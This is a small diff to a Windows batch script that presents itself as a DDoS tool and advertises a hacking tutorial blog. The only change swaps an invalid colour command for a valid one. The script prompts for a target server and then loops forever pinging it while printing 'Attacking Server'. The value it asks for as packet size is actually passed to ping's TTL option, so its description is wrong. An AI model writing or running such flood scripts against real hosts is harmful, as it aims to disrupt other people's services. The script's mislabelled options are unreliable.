@@ -26,7 +26,7 @@ set /p n=Packet Size:
 echo visit our tutorial programming hacking in www.geekinovationstudio.blogspot.com
 echo.
 :DDOS
-color green
+color 2
 echo Attacking Server %m%
 ping %m% -i %n% -t >nul
 goto DDOS
